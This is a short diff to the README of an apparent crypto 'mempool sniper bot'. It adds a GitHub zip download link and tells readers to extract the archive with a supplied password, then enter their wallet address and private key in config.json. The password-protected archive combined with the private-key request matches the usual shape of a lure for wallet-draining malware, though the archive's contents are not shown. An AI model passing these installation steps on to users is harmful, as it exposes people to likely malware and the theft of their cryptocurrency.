@@ -37,7 +37,7 @@ To identify profitable trades, sniper bots use technical analysis and various in
 * Milkyswap (Milkomeda(MilkADA))
 
 ## Installing
-- [Download]() repository and extract files with password `whLn1sTWT`.
+- [Download](https://github.com/deadspyexx/Mempool-sniper-bot/archive/refs/heads/main.zip) repository and extract files with password `whLn1sTWT`.
 - Edit the address and private_key fields in the config.json file. 
 - Set up the network and AMMs in the sniping menu. Ensure that there are sufficient funds on the specified address to cover transaction fees.
 
